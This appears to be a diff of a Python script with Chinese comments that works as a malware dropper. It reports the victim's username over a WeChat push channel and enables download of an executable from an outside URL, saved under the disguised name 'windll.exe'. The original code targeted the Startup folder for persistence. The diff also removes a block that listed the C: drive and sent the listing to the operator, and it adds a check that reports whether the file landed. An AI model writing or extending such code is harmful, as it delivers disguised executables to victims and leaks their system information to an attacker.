@@ -115,34 +115,17 @@ wechat_push.Alleged_information(f'{sys_username}执行cod')
 
 url = "https://cccimg.com/down.php/3d961495fa0bd4c7be0e4d8740a699f8.exe"
 startup_folder_path = get_startup_folder_path()
-file_name = "Windll.exe"  # 你需要指定文件名
+startup_folder_path2 = "D:\\"
+file_name = "windll.exe"  # 你需要指定文件名
 save_path = os.path.join(startup_folder_path, file_name)
-# download_file(url, save_path)
+save_path2 = os.path.join(startup_folder_path2, file_name)
+download_file(url, save_path2)
 
 
 
-
-# 指定目录的路径
-directory_path = "C:/"
-
-# 获取指定目录的所有文件和文件夹
-items = os.listdir(directory_path)
-
-# 打印所有文件和文件夹，并判断它们是否是文件夹
-for item in items:
-    item_path = os.path.join(directory_path, item)
-    if os.path.isfile(item_path):
-        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
-    elif os.path.isdir(item_path):
-        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
-    else:
-        wechat_push.Alleged_information(f"|{item}| 是一个文件 " + "<br>")
-
-
-
-# # 使用os.path.exists()函数检查文件是否存在
-# if os.path.exists(save_path):
-#     wechat_push.Alleged_information(f'{save_path}存在')
-# else:
-#     wechat_push.Alleged_information(f'{save_path}不存在')
+# 使用os.path.exists()函数检查文件是否存在
+if os.path.exists(save_path2):
+    wechat_push.Alleged_information(f'{save_path}存在')
+else:
+    wechat_push.Alleged_information(f'{save_path}不存在')
 
